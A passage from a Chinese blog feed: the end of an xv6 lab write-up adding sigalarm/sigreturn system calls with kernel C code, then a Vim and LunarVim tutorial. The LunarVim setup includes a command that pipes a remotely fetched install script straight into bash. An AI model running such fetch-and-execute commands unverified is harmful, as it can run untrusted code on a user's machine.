class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_mkdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_mknod</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_open</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_pipe</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_read</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sbrk</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sleep</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_unlink</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_wait</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_write</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_uptime</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<span class="hljs-comment">//</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">uint64</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>= &#123;<br>[SYS_fork]    sys_fork,<br>[SYS_exit]    sys_exit,<br>[SYS_wait]    sys_wait,<br>[SYS_pipe]    sys_pipe,<br>[SYS_read]    sys_read,<br>[SYS_kill]    sys_kill,<br>[SYS_exec]    sys_exec,<br>[SYS_fstat]   sys_fstat,<br>[SYS_chdir]   sys_chdir,<br>[SYS_dup]     sys_dup,<br>[SYS_getpid]  sys_getpid,<br>[SYS_sbrk]    sys_sbrk,<br>[SYS_sleep]   sys_sleep,<br>[SYS_uptime]  sys_uptime,<br>[SYS_open]    sys_open,<br>[SYS_write]   sys_write,<br>[SYS_mknod]   sys_mknod,<br>[SYS_unlink]  sys_unlink,<br>[SYS_link]    sys_link,<br>[SYS_mkdir]   sys_mkdir,<br>[SYS_close]   sys_close,<br>[SYS_sigalarm] sys_sigalarm,<span class="hljs-comment">//</span><br>[SYS_sigreturn] sys_sigreturn,<span class="hljs-comment">//</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>在sysproc.c中加入sys_sigalarm和sys_sigreturn函数处理代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64 </span><br><span class="hljs-function"><span class="hljs-title">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> n;<br>  uint64 fn;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(argaddr(<span class="hljs-number">1</span>, &amp;fn) &lt; <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> sigalarm(n, (<span class="hljs-keyword">void</span>(*)())(fn));<br>&#125;<br><br><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">return</span> sigreturn();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>关于test1的提示：</p><ul><li>解决方案将要求您保存和恢复寄存器– 您需要保存和恢复哪些寄存器才能正确地恢复被中断的代码？(提示: 会有很多)。</li><li>当计时器关闭时，用户陷阱在 struct proc 中保存足够的状态，这样签名返回就可以正确地返回到被中断的用户代码。</li><li>防止对处理程序的重入调用——如果处理程序还没有返回，内核就不应该再次调用它。</li></ul><p>硬件时钟每次都强制执行一个中断，这个中断在 kernel/trap.c 中的 usertrap ()中处理。每次时钟发生硬件中断，都统计一次，到了次数就执行handler</p><p>在proc中加入如下变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <br>  <span class="hljs-keyword">int</span> alarm_interval; <span class="hljs-comment">//n in sigalarm(n, (void(*)())(fn));</span><br>  <span class="hljs-keyword">void</span>(*alarm_handler)();<span class="hljs-comment">// fn in sigalarm(n, (void(*)())(fn));</span><br>  <span class="hljs-keyword">int</span> alarm_ticks;<span class="hljs-comment">//after alarm_ticks will </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">saved_trapframe</span>;</span><br>  <span class="hljs-keyword">int</span> alarm_flag;<br>&#125;;<br></code></pre></td></tr></table></figure><p>完善sigalarm和sigreturn函数，并在defs.h中加入声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// defs.h</span><br><span class="hljs-function"><span class="hljs-keyword">int</span>             <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">void</span> (*)())</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span>             <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">//trap.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ticks, <span class="hljs-keyword">void</span> (*handler)())</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>  p-&gt;alarm_interval=ticks;<br>  p-&gt;alarm_handler=handler;<br>  p-&gt;alarm_ticks=ticks;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br>  *p-&gt;trapframe = *p-&gt;saved_trapframe;<br>  p-&gt;alarm_flag = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>allocproc函数和freeproc函数也需要更新</p><ul><li>进程创建和销毁时结构体的字段的设置</li></ul><p>对进程的字段进行初始化和销毁以及页的申请</p><ul><li>使用kalloc给p-&gt;saved_trapframe分配空间</li><li>使用kfree((void *)p-&gt;saved_trapframe);销毁空间</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Look in the process table for an UNUSED proc.</span><br><span class="hljs-comment">// If found, initialize state required to run in the kernel,</span><br><span class="hljs-comment">// and return with p-&gt;lock held.</span><br><span class="hljs-comment">// If there are no free procs, or a memory allocation fails, return 0.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct proc*</span><br><span class="hljs-function"><span class="hljs-title">allocproc</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state == UNUSED) &#123;<br>      <span class="hljs-keyword">goto</span> found;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      release(&amp;p-&gt;lock);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>found:<br>  p-&gt;pid = allocpid();<br><br>  <span class="hljs-comment">// Allocate a trapframe page.</span><br>  <span class="hljs-keyword">if</span>((p-&gt;trapframe = (struct trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// An empty user page table.</span><br>  p-&gt;pagetable = proc_pagetable(p);<br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>   <span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span>((p-&gt;saved_trapframe = (struct trapframe *)kalloc()) == <span class="hljs-number">0</span>)&#123;<br>    freeproc(p);<br>    release(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-comment">// Set up new context to start executing at forkret,</span><br>  <span class="hljs-comment">// which returns to user space.</span><br>  <span class="hljs-built_in">memset</span>(&amp;p-&gt;context, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(p-&gt;context));<br>  p-&gt;context.ra = (uint64)forkret;<br>  p-&gt;context.sp = p-&gt;kstack + PGSIZE;<br><br>  p-&gt;alarm_flag=<span class="hljs-number">0</span>;<span class="hljs-comment">//</span><br>  p-&gt;alarm_interval = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_handler = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_ticks = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">return</span> p;<br>&#125;<br><br><span class="hljs-comment">// free a proc structure and the data hanging from it,</span><br><span class="hljs-comment">// including user pages.</span><br><span class="hljs-comment">// p-&gt;lock must be held.</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">freeproc</span><span class="hljs-params">(struct proc *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(p-&gt;trapframe)<br>    kfree((<span class="hljs-keyword">void</span>*)p-&gt;trapframe);<br>  p-&gt;trapframe = <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-keyword">if</span>(p-&gt;pagetable)<br>    proc_freepagetable(p-&gt;pagetable, p-&gt;sz);<br>  <br>  <span class="hljs-keyword">if</span>(p-&gt;saved_trapframe)<br>    kfree((<span class="hljs-keyword">void</span> *)p-&gt;saved_trapframe);<br>    <br>  p-&gt;pagetable = <span class="hljs-number">0</span>;<br>  p-&gt;sz = <span class="hljs-number">0</span>;<br>  p-&gt;pid = <span class="hljs-number">0</span>;<br>  p-&gt;parent = <span class="hljs-number">0</span>;<br>  p-&gt;name[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  p-&gt;chan = <span class="hljs-number">0</span>;<br>  p-&gt;killed = <span class="hljs-number">0</span>;<br>  p-&gt;xstate = <span class="hljs-number">0</span>;<br>  p-&gt;state = UNUSED;<br>  <br>  p-&gt;alarm_flag=<span class="hljs-number">0</span>;<span class="hljs-comment">//</span><br>  p-&gt;alarm_interval = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_handler = <span class="hljs-number">0</span>;<br>  p-&gt;alarm_ticks = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>评分</p><p><img src="https://img.gls.show/img/b48525193508d98e10d9e31c3878fbf3.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机教育中缺失的一课——Vim</title>
    <link href="/p/4f2baa62/"/>
    <url>/p/4f2baa62/</url>
    
    <content type="html"><![CDATA[<h1 id="Vim简介——编辑器之神"><a href="#Vim简介——编辑器之神" class="headerlink" title="Vim简介——编辑器之神"></a>Vim简介——编辑器之神</h1><p>Vim是一个文本编辑器，被称为编辑器之神，但与之强大功能所对应的，是陡峭的学习曲线</p><p>很多人学习Vim都是从入门到放弃，之后便将其束之高阁。但是掌握之后，你将感受到Vim哲学与效率的巨大提升</p><p><img src="/image/vim-tutorial/vim-1.jpg"></p><p>在学习之前需要明确的几点：</p><ul><li><p>学习Vim在开始是痛苦的</p></li><li><p>只有多用才会熟练</p></li><li><p>克服的一切困难都是值得的</p></li></ul><p>下面是Vim的一个快速使用示范：</p><ul><li><p>在命令行中键入<code>Vim 1.cpp</code>，会直接进入Vim的普通模式（Normal Pattern），此时是无法输入文字的</p></li><li><p>按下<code>i</code>，便进入了编辑模式（Insert Pattern），在编辑模式下，方可键入文字</p></li><li><p>输入文字</p></li><li><p>按下<code>ESC</code>，输入<code>:wq</code>，我们便回到了命令行，并且成功完成了文件的编辑</p></li></ul><h1 id="Vim模式"><a href="#Vim模式" class="headerlink" title="Vim模式"></a>Vim模式</h1><p>在上面我们可以发现，Vim具有普通模式和编辑模式（这是最常用的模式），不同的模式具有不同的特点，这是Vim的特性，也是我们初学会感受到别扭的地方</p><p>在普通模式下不可以插入文字，只能输入命令。要想进行编辑，需要切换到插入模式</p><p><img src="/image/vim-tutorial/image-20220103233026488.png" alt="模式切换"></p><p>Vim打开之后即进入普通模式，<strong>在Vim的普通模式下，所有的键都是功能键。</strong>对于以下不同情景的目的，有不同的按键帮助我们提升效率</p><p>对于以下特殊情景，不同的快捷键可以快速移动光标。比如输入2 G，即可移动到第二行</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="移动到特定位置："><a href="#移动到特定位置：" class="headerlink" title="移动到特定位置："></a><strong>移动到特定位置：</strong></h2><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>0</td><td>光标移动到行首</td></tr><tr><td>$</td><td>光标移动到行尾部</td></tr><tr><td>gg</td><td>光标移动到文件的第一个字符</td></tr><tr><td>G</td><td>光标移动到文件的最后一个字符</td></tr><tr><td>n G</td><td>光标移动到第n行</td></tr><tr><td>w</td><td>光标移动到下个单词的开始</td></tr><tr><td>e</td><td>光标移动到本单词最后一个字母</td></tr><tr><td>b</td><td>光标移动到本单词的第一个字母</td></tr></tbody></table><p><strong>上下左右：</strong></p><p>除了上下左右箭头可以移动之外，Vim支持使用<code>hjkl</code>进行光标的移动，分别对应</p><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>h 或 左箭头键</td><td>光标向左移动一个字符</td></tr><tr><td>j 或 向下箭头</td><td>光标向下移动一个字符</td></tr><tr><td>k 或 向上箭头</td><td>光标向上移动一个字符</td></tr><tr><td>l 或 向右箭头</td><td>光标向右移动一个字符</td></tr></tbody></table><h2 id="字符串匹配"><a href="#字符串匹配" class="headerlink" title="字符串匹配"></a><strong>字符串匹配</strong></h2><p>输入<code>/</code>之后，可以输入<code>text</code>，之后光标会移动到text首次出现的地方，在这之后：</p><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>n</td><td>光标移动到下一个text出现的地方</td></tr><tr><td>N</td><td>光标移动到前一个text出现的地方</td></tr></tbody></table><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a><strong>替换</strong></h2><p>普通模式，可以替换单个字母，方式很简单，先按下r，然后输入要替换的字母即可</p><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a><strong>删除</strong></h2><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>dw</td><td>删除光标到下个单词的开始处所有文本</td></tr><tr><td>de</td><td>删除光标到本单词的结束处所有文本</td></tr><tr><td>d2w</td><td>删除光标到后面第二个单词的开始处所有文本</td></tr></tbody></table><h2 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a><strong>撤销</strong></h2><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>u</td><td>撤销</td></tr><tr><td>ctrl+r</td><td>撤销你的撤销</td></tr></tbody></table><h2 id="拷贝-粘贴"><a href="#拷贝-粘贴" class="headerlink" title="拷贝/粘贴"></a><strong>拷贝/粘贴</strong></h2><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>yy</td><td>拷贝当前行</td></tr><tr><td>p</td><td>在当前位置后面粘贴</td></tr><tr><td>P</td><td>在当前位置的下一行粘贴</td></tr></tbody></table><h2 id="普通模式切换到插入模式"><a href="#普通模式切换到插入模式" class="headerlink" title="普通模式切换到插入模式"></a><strong>普通模式切换到插入模式</strong></h2><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>a</td><td>在光标后插入</td></tr><tr><td>o</td><td>在当前行后面插入一个新行</td></tr><tr><td>O</td><td>在当前行前面插入一个新行</td></tr></tbody></table><h2 id="保存-退出"><a href="#保存-退出" class="headerlink" title="保存/退出"></a>保存/退出</h2><p>保存/退出都要在命令模式下完成</p><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>：w</td><td>仅保存</td></tr><tr><td>：q</td><td>退出</td></tr><tr><td>：wq</td><td>保存且退出</td></tr></tbody></table><h1 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h1><ul><li><p>vimtutor命令打开官方教程，并建立一份教程文件的拷贝，该教程有各种语言的版本，如果想要打开中文版本，输入<code>vimtutor zh</code>即可</p></li><li><p>按 CTRL-O 回跳，C-I后跳</p></li><li><p>ZZ保存并退出</p></li><li><p>“J” 命令删除两行间的换行符</p></li><li><p>x删除单个字符</p></li><li><p>dd删除整行</p></li><li><p>u撤销</p></li><li><p>U撤销整行所有修改</p></li><li><p>C-R撤销你的撤销</p></li><li><p>9k向上移动 9 行</p></li><li><p>w向后移动一个单词</p></li><li><p>b向前移动一个单词</p></li><li><p>f向右移动到一个指定的字符，fy向右移动到第一个y出现的位置    </p></li><li><p>F向左移动到一个指定的字符</p></li><li><p>%进行括号匹配</p></li><li><p>“H” 表示 “Home” (头)，”M” 表示 “Middle” (中) 而 “L” 表示 “Last” (尾)</p></li><li><p>C-G输出你现在在的位置</p></li><li><p>C-D向下滚屏</p></li><li><p>C-U向上</p></li><li><p>zz让光标保持在屏幕中间</p></li><li><p>/pattern进行字符串匹配，n向后查找，N向前查找</p></li><li><p>^匹配行首，$匹配行尾，d$删除光标到尾端所有的文本</p></li><li><p>cw修改一个词，c2w修改两个词，c$修改到行尾，cc修改一整行。确切地说，它删除一个词，并切换到插入模式</p></li><li><p>灵活的组合上面命令，/pattern查找字符串，cw修改单词，n找到下一个单词，<code>.</code>重复修改操作，n继续下一个单词</p></li><li><p>dd+p可以用来移动文本</p></li><li><p>p接受计数前缀，比如3p就是插入相同的文本三次</p></li><li><p>xp可以交换两个字符，比如你把the打成了teh，那么把光标放到e下面，按下xp即可</p></li><li><p>y是yank（抽出）的意思，可以将文本拷贝到寄存器中，然后使用p粘贴到别的地方。yw就是拷贝一个单词的意思。yy拷贝一整行</p></li><li><p>yaw表示yank a word，可以在一个单词的任意位置复制该单词</p></li><li><p>一些经常用到的文本删除：</p></li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs less"><br><span class="hljs-selector-tag">x</span>       删除光标下的字符 (<span class="hljs-string">&quot;dl&quot;</span> 的缩写)<br><span class="hljs-selector-tag">X</span>       删除光标前的字符 (<span class="hljs-string">&quot;dh&quot;</span> 的缩写)<br><span class="hljs-selector-tag">D</span>       从当前位置删除到行尾 (<span class="hljs-string">&quot;d$&quot;</span> 的缩写)<br><span class="hljs-selector-tag">dw</span>      从当前位置删除到下一个单词开头<br><span class="hljs-selector-tag">db</span>      从当前位置删除到前一个单词的开头<br><span class="hljs-selector-tag">diw</span>     删除光标上的单词 (不包括空白字符)<br><span class="hljs-selector-tag">daw</span>     删除光标上的单词 (包括空白字符)<br><span class="hljs-selector-tag">dG</span>      删除到文件末<br><span class="hljs-selector-tag">dgg</span>     删除到文件首<br><br></code></pre></td></tr></table></figure><ul><li><p>~ 将字符的大小写转换</p></li><li><p>I移动到当前行第一个非空字符处并切换到插入模式</p></li><li><p>A移动到行尾并切换到插入模式</p></li></ul><h1 id="vimtutor"><a href="#vimtutor" class="headerlink" title="vimtutor"></a>vimtutor</h1><h1 id="lunavim"><a href="#lunavim" class="headerlink" title="lunavim"></a>lunavim</h1><p>首先要安装最新版neovim，如果是Ubuntu直接apt install可能会安装较低版本的nvim，不符合lunavim的版本要求，可以参考<a href="https://github.com/neovim/neovim/releases/tag/stable%E8%BF%9B%E8%A1%8C%E5%AE%89%E8%A3%85">https://github.com/neovim/neovim/releases/tag/stable进行安装</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://github.com/neovim/neovim/releases/download/stable/nvim-linux64.deb<br><br>sudo apt install ./nvim-linux64.deb<br></code></pre></td></tr></table></figure><p>如果版本过低需要先卸载neovim再重新安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt remove neovim-runtime    <br>sudo apt remove neovim  <br></code></pre></td></tr></table></figure><p>安装lunavim</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install cargo<br><br>sudo apt-get install neovim    #需要cargo<br><br>LV_BRANCH=&#x27;release-1.2/neovim-0.8&#x27; bash &lt;(curl -s https://raw.githubusercontent.com/lunarvim/lunarvim/fc6873809934917b470bff1b072171879899a36b/utils/installer/install.sh)<br></code></pre></td></tr></table></figure><blockquote><p>[ERROR]: Unable to verify plugins, make sure to manually run ‘:PackerSync’ when starting lvim for the first time.</p><p>添加环境变量即可：</p><p><code>export PATH=&quot;$PATH:/home/$USER/.local/bin&quot;</code></p><p>source ~/.bashrc</p></blockquote><p>还遇到了一些由于网络因素被墙无法访问外网下载插件的问题，给服务器挂代理即可解决。由于Linux挂代理比较麻烦，因此建议直接走主机代理</p><h1 id="一些好用的vim资源"><a href="#一些好用的vim资源" class="headerlink" title="一些好用的vim资源"></a>一些好用的vim资源</h1><ul><li><a href="https://www.openvim.com/">https://www.openvim.com/</a></li><li><a href="https://vim.rtorr.com/">Vim Cheat Sheet</a></li><li><a href="https://yianwillis.github.io/vimcdoc/doc/help.html">vim中文文档计划</a></li><li>vim的官方教程（在命令行中输入vimtutor）</li><li><a 